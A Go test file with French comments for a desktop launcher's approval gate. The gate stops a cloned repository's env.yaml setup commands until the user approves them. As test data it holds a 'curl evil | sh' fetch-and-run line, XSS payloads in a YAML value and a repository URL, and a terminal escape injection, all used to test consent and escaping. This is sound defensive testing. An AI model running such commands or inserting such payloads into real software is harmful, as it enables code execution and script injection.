//go:build !windows

package desktop

// #215 (amendement audit, critical) : approbation de l'environnement d'un projet cloné — garde d'ouverture (needTrust +
// évènement envTrust), envTrustInfo / envTrustAnswer, « Revoir », clone factice avec ou sans env.yaml, échappement.
// Faux git / faux claude / tmux dédié isolés (fixture de create215_test.go) ; backend podman DÉCLARÉ mais jamais appelé
// (la garde s'arrête avant tout démarrage) ; registre trust.json dans le CL_CONFIG_DIR du test.

import (
	"encoding/json"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"claude-launcher-ng2/core"
)

const (
	evil215     = "image: debian:12\nsetup:\n  - touch /tmp/PREUVE-ENV-215\non_start:\n  - echo <b>gras</b>\nmounts:\n  - path: /tmp\n"
	piege215    = "image: x\nsetup:\n  - \"<img src=x onerror=alert(1)> \\e[31mROUGE\"\n"
	registry215 = "trust.json"
)

// containerFix215 : fixture de create215 + un backend conteneur « pod » déclaré (jamais appelé).
func containerFix215(t *testing.T, gitBody string) *fix215 {
	t.Helper()
	f := newFix215(t, gitBody)
	cfgDir := os.Getenv("CL_CONFIG_DIR")
	if err := os.WriteFile(filepath.Join(cfgDir, "backends.yaml"), []byte("backends:\n  pod: {type: podman}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	return f
}

func writeEnv215(t *testing.T, dir, env string) {
	t.Helper()
	_ = os.MkdirAll(filepath.Join(dir, ".claude-launcher"), 0o755)
	if err := os.WriteFile(core.EnvPath(dir), []byte(env), 0o644); err != nil {
		t.Fatal(err)
	}
}

func regState215(t *testing.T, dir string) string {
	t.Helper()
	return string(core.EnvTrust(dir))
}

// projet existant du bac à sable (alpha), environnement du dépôt posé, entrée pending, affecté au backend pod.
func pendingProject215(t *testing.T, f *fix215, backend string) string {
	t.Helper()
	dir := filepath.Join(f.base, "TEST", "alpha")
	writeEnv215(t, dir, evil215)
	if ok, err := core.MarkEnvPending(dir, "https://github.com/a/b.git", "debian:12"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	if err := core.WriteAssignment(dir, backend); err != nil {
		t.Fatal(err)
	}
	f.a.rescan()
	return dir
}

func TestCloneAvecEnvYamlEcritPending215(t *testing.T) {
	f := containerFix215(t, `mkdir -p "$dest/.claude-launcher"; printf 'image: debian:12\nsetup:\n  - touch /tmp/PREUVE-ENV-215\n' > "$dest/.claude-launcher/env.yaml"`)
	args := gitArgs215(f.base)
	args["image"], args["backend"] = "docker.io/library/alpine:3.20", "pod"
	f.create(t, args)
	f.waitState(t, "done")
	dir := filepath.Join(f.base, "CLONES", "repo")
	e, ok := core.EnvTrustEntry(dir)
	if !ok || e.State != core.TrustPending || e.Source != "https://github.com/CCoupel/repo.git" || e.Image != "docker.io/library/alpine:3.20" || e.SHA == "" {
		t.Fatalf("entrée = %+v (présente=%v), attendu pending avec l'URL et le socle choisis", e, ok)
	}
	// le dépôt n'a rien exécuté : la preuve du setup n'existe pas
	if _, err := os.Stat("/tmp/PREUVE-ENV-215"); err == nil {
		_ = os.Remove("/tmp/PREUVE-ENV-215")
		t.Error("le setup du dépôt a été exécuté sans accord")
	}
	// l'ouverture qui suit le clonage ne démarre rien : la garde est posée
	if _, err := core.LoadEnv(dir); err == nil {
		t.Error("LoadEnv rend l'environnement d'un dépôt non approuvé")
	}
	if b, err := os.ReadFile(filepath.Join(os.Getenv("CL_CONFIG_DIR"), registry215)); err != nil || !strings.Contains(string(b), `"pending"`) {
		t.Errorf("registre = %q, %v", b, err)
	}
}

func TestCloneSansEnvYamlEnregistreNoneEtEnvApparuRedemande215(t *testing.T) {
	f := containerFix215(t, "")
	f.create(t, gitArgs215(f.base)) // exécution sur l'hôte : le launcher n'écrit aucun env.yaml
	f.waitState(t, "done")
	dir := filepath.Join(f.base, "CLONES", "repo")
	e, ok := core.EnvTrustEntry(dir)
	if !ok || e.State != core.TrustNone || e.Source != "https://github.com/CCoupel/repo.git" {
		t.Fatalf("entrée = %+v (présente=%v), attendu none avec l'URL", e, ok)
	}
	if core.EnvTrust(dir) != core.TrustNone {
		t.Errorf("EnvTrust = %s", core.EnvTrust(dir))
	}
	// aucune question à l'ouverture en conteneur (rien à approuver)
	if v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir}); v["needTrust"] != nil {
		t.Errorf("question posée pour un clone sans environnement : %v", v)
	}
	// un pull apporte un env.yaml : la question vient, et l'ouverture est refusée jusqu'à la réponse
	f.a.proposeInit(dir) // sans effet ; garde le projet ouvert dans l'arbre
	writeEnv215(t, dir, evil215)
	if core.EnvTrust(dir) != core.TrustPending || !core.EnvTrustChanged(dir) {
		t.Fatalf("env.yaml apparu : état %s changed=%v", core.EnvTrust(dir), core.EnvTrustChanged(dir))
	}
	info := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	if info["state"] != "pending" || info["changed"] != true {
		t.Errorf("envTrustInfo = %v, attendu pending avec changed:true", info)
	}
	// les autres sources n'ont pas d'entrée
	f.create(t, map[string]any{"base": f.base, "category": "TEST", "name": "vide", "raw": true})
	f.create(t, map[string]any{"base": f.base, "category": "TEST", "name": "tpl", "source": "template"})
	for _, n := range []string{"vide", "tpl"} {
		if _, ok := core.EnvTrustEntry(filepath.Join(f.base, "TEST", n)); ok {
			t.Errorf("entrée d'approbation pour la source %s", n)
		}
	}
}

// Entrée posée AVANT le clonage : pendant un clonage lent, le registre porte déjà pending ; un échec la retire.
func TestEntreePosAvantLeCloneEtRetireeSurEchec215(t *testing.T) {
	f := containerFix215(t, `exit 128`) // clone qui échoue
	f.create(t, gitArgs215(f.base))
	f.waitState(t, "failed")
	if _, ok := core.EnvTrustEntry(filepath.Join(f.base, "CLONES", "repo")); ok {
		t.Error("entrée d'approbation restée après un clonage échoué")
	}
	// clonage lent : entrée pending visible pendant le clone
	f2 := containerFix215(t, "echo $$ > $CL_TEST_PID\nsleep 120")
	t.Setenv("CL_TEST_PID", f2.pid)
	f2.create(t, gitArgs215(f2.base))
	var pid string
	for i := 0; i < 200 && pid == ""; i++ {
		if b, err := os.ReadFile(f2.pid); err == nil {
			pid = strings.TrimSpace(string(b))
		}
		time.Sleep(30 * time.Millisecond)
	}
	dir := filepath.Join(f2.base, "CLONES", "repo")
	if e, ok := core.EnvTrustEntry(dir); !ok || e.State != core.TrustPending {
		t.Errorf("pendant le clonage : entrée %+v (présente=%v), attendu pending posée avant", e, ok)
	}
	if j := f2.job(); j != nil {
		dispatchJSON(t, f2.a, "createCancel", map[string]any{"job": j.ID})
	}
	f2.waitState(t, "failed")
	if _, ok := core.EnvTrustEntry(dir); ok {
		t.Error("entrée d'approbation restée après l'annulation")
	}
}

// trust.json illisible : l'ouverture d'un projet cloné en conteneur est refusée (échec fermé), la réponse échoue, le
// fichier n'est jamais réécrit.
func TestRegistreIllisibleOuvertureRefusee215(t *testing.T) {
	f := containerFix215(t, "")
	dir := pendingProject215(t, f, "pod")
	reg := filepath.Join(os.Getenv("CL_CONFIG_DIR"), registry215)
	const broken = `{"truncated": `
	if err := os.WriteFile(reg, []byte(broken), 0o600); err != nil {
		t.Fatal(err)
	}
	v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir})
	if v["needTrust"] != true || v["tab"] != nil {
		t.Fatalf("open avec registre illisible = %v, attendu {needTrust:true}", v)
	}
	if f.a.term(dir) != nil {
		t.Error("onglet créé avec un registre illisible")
	}
	a := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": core.EnvFilesSHA(dir)})
	if a["ok"] != false || strings.TrimSpace(a["msg"].(string)) == "" {
		t.Errorf("envTrustAnswer avec registre illisible = %v, attendu un refus avec message", a)
	}
	if got, _ := os.ReadFile(reg); string(got) != broken {
		t.Errorf("trust.json réécrit : %q", got)
	}
	if _, err := os.Stat("/tmp/PREUVE-ENV-215"); err == nil {
		_ = os.Remove("/tmp/PREUVE-ENV-215")
		t.Error("setup exécuté malgré le registre illisible")
	}
}

func TestOuvertureEnConteneurPendingDemandeAccord215(t *testing.T) {
	f := containerFix215(t, "")
	dir := pendingProject215(t, f, "pod")
	v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir})
	if v["needTrust"] != true || v["path"] != dir || v["tab"] != nil {
		t.Fatalf("open = %v, attendu {needTrust:true, path}", v)
	}
	ev := f.r.wait(t, 5*time.Second, "envTrust", func(e map[string]any) bool { return e["_name"] == "envTrust" })
	if ev["path"] != dir || ev["state"] != "pending" || ev["source"] != "https://github.com/a/b.git" || ev["chosenImage"] != "debian:12" {
		t.Errorf("évènement envTrust = %v", ev)
	}
	// rien n'est démarré : aucun onglet, aucun processus de conteneur
	if f.a.term(dir) != nil {
		t.Error("onglet créé alors que l'accord n'est pas donné")
	}
	if _, err := os.Stat("/tmp/PREUVE-ENV-215"); err == nil {
		_ = os.Remove("/tmp/PREUVE-ENV-215")
		t.Error("setup du dépôt exécuté")
	}
}

func TestOuvertureSurHotePasDeQuestion215(t *testing.T) {
	f := containerFix215(t, "")
	dir := pendingProject215(t, f, "host")
	v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir})
	if v["needTrust"] != nil || v["tab"] != dir {
		t.Fatalf("open sur l'hôte = %v, attendu {tab} sans question", v)
	}
	for _, e := range f.r.all() {
		if e["_name"] == "envTrust" {
			t.Errorf("évènement envTrust pour un projet sur l'hôte : %v", e)
		}
	}
	if regState215(t, dir) != "pending" { // l'entrée reste : la question viendra au passage en conteneur
		t.Errorf("état = %s, attendu pending conservé", regState215(t, dir))
	}
}

func TestEnvTrustInfoContenuEtRisque215(t *testing.T) {
	f := containerFix215(t, "")
	dir := pendingProject215(t, f, "pod")
	v := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	if v["state"] != "pending" || v["sha"] == "" || v["chosenImage"] != "debian:12" {
		t.Fatalf("envTrustInfo = %v", v)
	}
	risk, _ := v["risk"].(map[string]any)
	if risk["exec"] != float64(2) || risk["hostMounts"] != float64(1) {
		t.Errorf("risk = %v, attendu exec 2 (setup + on_start) et 1 montage hors projet", risk)
	}
	files, _ := v["files"].(map[string]any)
	if files["env.yaml"] != evil215 {
		t.Errorf("fichier brut = %q", files["env.yaml"])
	}
	if _, err := f.a.Dispatch("envTrustInfo", json.RawMessage(`{"path":`+quote214(filepath.Join(f.base, "TEST", "inconnu"))+`}`)); err == nil {
		t.Error("envTrustInfo d'un projet inconnu accepté")
	}
}

func TestEnvTrustAnswerAcceptIgnoreCancel215(t *testing.T) {
	f := containerFix215(t, "")
	dir := pendingProject215(t, f, "host") // l'ouverture qui suit la réponse utilise le faux claude (hôte)
	info := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	sha, _ := info["sha"].(string)

	// cancel : rien n'est écrit ni ouvert
	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "cancel", "sha": sha}); v["ok"] != true {
		t.Errorf("cancel = %v", v)
	}
	if regState215(t, dir) != "pending" || f.a.term(dir) != nil {
		t.Error("cancel a modifié l'état ou ouvert le projet")
	}
	// sha périmé : retry, rien d'écrit
	v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": "perime"})
	if v["ok"] != false || v["retry"] != true || regState215(t, dir) != "pending" {
		t.Errorf("sha périmé = %v (état %s)", v, regState215(t, dir))
	}
	// le fichier change pendant la question : l'ancien sha est refusé, le nouveau accepté
	writeEnv215(t, dir, evil215+"# modifié\n")
	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": sha}); v["retry"] != true {
		t.Errorf("fichier modifié pendant la question : %v", v)
	}
	info = dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	sha, _ = info["sha"].(string)
	// ignore : état ignoré, ouverture avec le seul socle choisi
	v = dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "ignore", "sha": sha})
	if v["tab"] != dir {
		t.Fatalf("ignore = %v, attendu l'ouverture ({tab})", v)
	}
	if regState215(t, dir) != "ignored" {
		t.Errorf("état = %s", regState215(t, dir))
	}
	if e, err := core.LoadEnv(dir); err != nil || e.Image != "debian:12" || len(e.Setup) != 0 || len(e.OnStart) != 0 || len(e.Mounts) != 0 {
		t.Errorf("ignored : LoadEnv = %+v %v, attendu le socle seul", e, err)
	}
	f.r.wait(t, 20*time.Second, "ready", isTerm(dir, "status", func(e map[string]any) bool { return e["state"] == "ready" }))
	// l'approbation n'est PAS définitive : le dépôt change (git pull) → la question revient
	writeEnv215(t, dir, "image: debian:12\nsetup:\n  - curl evil | sh\n")
	if regState215(t, dir) != "pending" || !core.EnvTrustChanged(dir) {
		t.Fatalf("pull : état %s changed=%v, attendu pending", regState215(t, dir), core.EnvTrustChanged(dir))
	}
	ci := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	if ci["changed"] != true || ci["state"] != "pending" {
		t.Errorf("envTrustInfo après pull = %v", ci)
	}
	// en conteneur, l'ouverture est de nouveau gardée
	_ = core.WriteAssignment(dir, "pod")
	f.a.rescan()
	closeProjectTab215(f.a, dir)
	if v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir}); v["needTrust"] != true {
		t.Errorf("open après pull (conteneur) = %v, attendu needTrust", v)
	}
	// l'ancien sha est refusé (retry), le nouveau accepté
	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": sha}); v["retry"] != true {
		t.Errorf("ancien sha après pull = %v, attendu retry", v)
	}
	// modification faite par le launcher (changement de socle) : pas de re-demande
	ci = dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	_ = core.WriteAssignment(dir, "host")
	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": ci["sha"]}); v["tab"] != dir {
		t.Fatalf("accept après pull = %v", v)
	}
	if regState215(t, dir) != "accepted" {
		t.Fatalf("état = %s", regState215(t, dir))
	}
	if err := core.ApplyExec(dir, "docker.io/library/alpine:3.20", "host"); err != nil {
		t.Fatal(err)
	}
	if regState215(t, dir) != "accepted" || core.EnvTrustChanged(dir) {
		t.Errorf("écriture du launcher : état %s changed=%v, attendu aucune re-demande", regState215(t, dir), core.EnvTrustChanged(dir))
	}
	// une réponse sans question en attente est refusée
	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": sha}); v["ok"] != false {
		t.Errorf("réponse sans question en attente = %v", v)
	}
	// projet inconnu : erreur
	b, _ := json.Marshal(map[string]any{"path": filepath.Join(f.base, "TEST", "inconnu"), "choice": "accept", "sha": "x"})
	if _, err := f.a.Dispatch("envTrustAnswer", b); err == nil {
		t.Error("envTrustAnswer d'un projet inconnu accepté")
	}
}

func TestEnvTrustAcceptEnvBrutApresRevoir215(t *testing.T) {
	f := containerFix215(t, "")
	dir := pendingProject215(t, f, "host")
	info := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": dir})
	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": info["sha"]}); v["tab"] != dir {
		t.Fatalf("accept = %v", v)
	}
	f.r.wait(t, 20*time.Second, "ready", isTerm(dir, "status", func(e map[string]any) bool { return e["state"] == "ready" }))
	if e, err := core.LoadEnv(dir); err != nil || len(e.Setup) != 1 || len(e.OnStart) != 1 {
		t.Errorf("accepted : environnement brut attendu : %+v %v", e, err)
	}
	// « Revoir » refusé tant que le projet est ouvert
	v := dispatchJSON(t, f.a, "projectApply", map[string]any{"path": dir, "envTrust": "review"})
	if v["ok"] != false || !strings.Contains(v["msg"].(string), "ouvert") || regState215(t, dir) != "accepted" {
		t.Errorf("revoir projet ouvert = %v (état %s)", v, regState215(t, dir))
	}
	// projet fermé (jamais ouvert) : accepté → Revoir → pending, et projectSettings l'expose
	beta := filepath.Join(f.base, "TEST", "beta")
	_ = os.MkdirAll(beta, 0o755)
	if out, err := exec.Command("git", "-C", beta, "init", "-q").CombinedOutput(); err != nil {
		t.Fatalf("git init : %v %s", err, out)
	}
	writeEnv215(t, beta, evil215)
	_, _ = core.MarkEnvPending(beta, "https://github.com/a/b.git", "debian:12")
	_ = core.WriteAssignment(beta, "host")
	f.a.rescan()
	bi := dispatchJSON(t, f.a, "envTrustInfo", map[string]any{"path": beta})
	if _, err := core.AnswerEnvTrust(beta, "accept", bi["sha"].(string)); err != nil || regState215(t, beta) != "accepted" {
		t.Fatalf("accept direct : %v %s", err, regState215(t, beta))
	}
	v = dispatchJSON(t, f.a, "projectApply", map[string]any{"path": beta, "envTrust": "review"})
	if v["ok"] != true || regState215(t, beta) != "pending" {
		t.Fatalf("revoir projet fermé = %v (état %s)", v, regState215(t, beta))
	}
	s := dispatchJSON(t, f.a, "projectSettings", map[string]any{"path": beta})
	et, _ := s["envTrust"].(map[string]any)
	if et["state"] != "pending" || et["source"] != "https://github.com/a/b.git" || et["at"] == "" {
		t.Errorf("projectSettings.envTrust = %v", s["envTrust"])
	}
	if b, _ := json.Marshal(s["envTrust"]); strings.Contains(string(b), "setup") || strings.Contains(string(b), "PREUVE") {
		t.Errorf("projectSettings.envTrust expose le contenu des fichiers : %s", b)
	}
	// projet de confiance : pas de champ envTrust ; « Revoir » refusé
	gamma := filepath.Join(f.base, "TEST", "gamma")
	_ = os.MkdirAll(gamma, 0o755)
	_ = exec.Command("git", "-C", gamma, "init", "-q").Run()
	f.a.rescan()
	s = dispatchJSON(t, f.a, "projectSettings", map[string]any{"path": gamma})
	if _, has := s["envTrust"]; has {
		t.Errorf("projet de confiance : envTrust = %v", s["envTrust"])
	}
	if v := dispatchJSON(t, f.a, "projectApply", map[string]any{"path": gamma, "envTrust": "review"}); v["ok"] != false {
		t.Errorf("revoir un projet de confiance = %v", v)
	}
}

// Échappement : les textes du dépôt voyagent en JSON (jamais en HTML) — chevrons échappés, type JSON, pas de sniffing ;
// côté web, aucun HTML du dépôt n'est servi comme tel.
func TestEnvTrustTextesDuDepotNeSontJamaisDuHTML215(t *testing.T) {
	f := containerFix215(t, "")
	dir := filepath.Join(f.base, "TEST", "alpha")
	writeEnv215(t, dir, piege215)
	_, _ = core.MarkEnvPending(dir, "https://github.com/a/<script>alert(1)</script>.git", "x")
	_ = core.WriteAssignment(dir, "pod")
	f.a.rescan()
	w := &webBridge{app: f.a, token: "tok215t", subs: map[chan []byte]bool{}, strictHost: true}
	srv := httptest.NewServer(w.handler())
	defer srv.Close()
	resp, body := doWith(t, srv.URL, "POST", "/api/call", "", "tok215t",
		`{"method":"envTrustInfo","args":{"path":`+quote214(dir)+`}}`, "application/json", "")
	if resp.StatusCode != 200 {
		t.Fatalf("envTrustInfo web : %d %s", resp.StatusCode, body)
	}
	if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, "application/json") {
		t.Errorf("Content-Type = %q, attendu application/json", ct)
	}
	if strings.Contains(body, "<img") || strings.Contains(body, "<script") {
		t.Errorf("chevrons du dépôt non échappés dans la réponse JSON : %s", body)
	}
	if strings.Contains(body, "\x1b") {
		t.Error("octet ESC brut dans la réponse")
	}
	var v map[string]any
	_ = json.Unmarshal([]byte(body), &v)
	if res, ok := v["result"].(map[string]any); ok {
		v = res
	}
	files, _ := v["files"].(map[string]any)
	if s, _ := files["env.yaml"].(string); !strings.Contains(s, "<img src=x onerror=alert(1)>") {
		t.Errorf("le texte du dépôt doit arriver intact (l'échappement est celui de l'affichage) : %q", s)
	}
	if v["source"] != "https://github.com/a/<script>alert(1)</script>.git" {
		t.Errorf("source = %v", v["source"])
	}
}

// closeProjectTab215 : retire l'onglet (la session reste, sans importance ici : la garde porte sur open).
func closeProjectTab215(a *App, dir string) { a.detachTab(dir) }

// Clone SANS env.yaml avec un socle conteneur choisi : le launcher écrit lui-même env.yaml après le clone, l'état reste
// « none » (décidé sur le dépôt seul) — aucune question sur son propre fichier, mais un pull ultérieur redemande.
func TestCloneSansEnvAvecSocleResteNone215(t *testing.T) {
	f := containerFix215(t, "")
	args := gitArgs215(f.base)
	args["image"], args["backend"] = "docker.io/library/alpine:3.20", "pod"
	f.create(t, args)
	f.waitState(t, "done")
	dir := filepath.Join(f.base, "CLONES", "repo")
	if _, err := os.Stat(core.EnvPath(dir)); err != nil {
		t.Fatalf("env.yaml du launcher absent : %v", err)
	}
	if e, ok := core.EnvTrustEntry(dir); !ok || e.State != core.TrustNone || core.EnvTrust(dir) != core.TrustNone || core.EnvTrustChanged(dir) {
		t.Fatalf("entrée = %+v (présente=%v) état=%s changed=%v, attendu none sans question", e, ok, core.EnvTrust(dir), core.EnvTrustChanged(dir))
	}
	if v := dispatchJSON(t, f.a, "open", map[string]any{"path": dir}); v["needTrust"] != nil {
		t.Errorf("question posée sur le propre env.yaml du launcher : %v", v)
	}
	// le dépôt modifie ensuite env.yaml (pull) : la question revient
	writeEnv215(t, dir, evil215)
	if core.EnvTrust(dir) != core.TrustPending || !core.EnvTrustChanged(dir) {
		t.Errorf("pull : état %s changed=%v, attendu pending", core.EnvTrust(dir), core.EnvTrustChanged(dir))
	}
}
